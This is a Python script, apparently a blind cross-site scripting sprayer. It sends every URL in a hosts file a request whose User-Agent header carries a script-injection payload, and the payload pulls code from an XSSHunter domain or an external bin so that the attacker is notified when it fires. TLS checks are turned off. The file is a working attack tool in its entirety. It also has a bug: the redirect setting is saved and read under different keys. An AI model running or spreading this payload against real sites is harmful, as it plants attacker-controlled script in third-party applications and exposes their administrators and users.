import requests , optparse , concurrent.futures , urllib3
from os import path

def Validation(Options):
    # Main Config For `Main`
    Config = {
        "file":"",
        "xsshunter":"",
        "bin":"",
        "mode":"",
        "payload":"",
        "redirection":""
    }

    # File Validation
    if Options.file != None:
        if path.exists(Options.file):
            Config["file"] = Options.file
        else:
            print("The file you selected: {0}. doesn't exists".format(Options.file)); exit()
    else:
        print("You didn't select a file to use with the tool."); exit()

    # XSSHunter And Bin Validation 
    if Options.username != None:
        if Options.bin != None:
            print("You can't use both XSSHunter and ExternalBin."); exit()
        else:
            XSSHunter = "{0}.xss.ht".format(Options.username)
            Config["xsshunter"] = XSSHunter
    else:
        if Options.bin == None:
            print("Please use your XSSHunter username or use an ExternalBin"); exit()
        else:
            Config["bin"] = Options.bin

    # Payload Validation
    if Options.payload != None:
        # The User Selected a Payload
        if "XXX" not in Options.payload:
            print("You didn't add the replace string. use 'XXX' with your payload to replace it with the XSSHunter/Bin"); exit()
        else:
            Config["payload"] = Options.payload
    else:
        Config["payload"] = '"><script src=XXX></script>'

    # Redirection Validation
    if Options.redirect != None:
        if Options.redirect == "allow" or Options.redirect == "deny":
            pass
        else:
            print("You didn't select any valid mode for redirection. the only valid mode is `allow` and `deny`"); exit()
    else:
        Config["redirect"] = "allow"

    return Config

def Sender(URL , Redirect , Payload , Hunter):
    Payload = Payload.replace("XXX" , Hunter)

    try:
        if Redirect == "allow":
            Response = requests.get(URL , verify=False , timeout=5 , headers={"User-Agent":Payload} , allow_redirects=True)
            print("\rRequest Has Been Sent To: {0}, Status-Code: {1}".format(URL , str(Response.status_code)))
        else:
            Response = requests.get(URL , verify=False , timeout=5 , headers={"User-Agent":Payload} , allow_redirects=False)
            print("Request Has Been Sent To: {0}, Status-Code: {1}".format(URL , str(Response.status_code)))
    except Exception as e:
        print("Can't Request This URL: {0}".format(URL))

def CollectOptions():
    Parser = optparse.OptionParser()
    Parser.add_option("-f" , "--file" , dest="file" , help="The Hosts File You Want To Use")
    Parser.add_option("-u" , "--username" , dest="username" , help="Your XSSHunter Username")
    Parser.add_option("-p" , "--payload" , dest="payload" , help="The Payload You Want To Use Instead Of The Default One")
    Parser.add_option("-b" , "--bin" , dest="bin" , help="Your External Bin You Want To Use To Detect If The Payload Is Fired")
    Parser.add_option("-r" , "--redirections" , dest="redirect" , help="Redirection Mode To Allow/Disallow Them")

    Options , _ = Parser.parse_args()
    return Options

def Main(Options):
    with concurrent.futures.ThreadPoolExecutor() as Validate:
        Config = Validate.submit(Validation , Options)
        Config = Config.result()

    if Config["bin"] == '':
        Hunter = "https://" + Config["xsshunter"] + "/"
    else:
        Hunter = Config["bin"]

    URLs = open(Config["file"] , 'r')
    for URL in URLs:
        URL = URL.rstrip("\n")
        Sender(URL=URL , Redirect=Config["redirection"] , Payload=Config["payload"] , Hunter=Hunter)


if __name__ == '__main__':
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    with concurrent.futures.ThreadPoolExecutor() as OptionsCollector:
        Options = OptionsCollector.submit(CollectOptions)
        Options = Options.result()

    with concurrent.futures.ThreadPoolExecutor() as Threader:
        _ = Threader.submit(Main , Options)
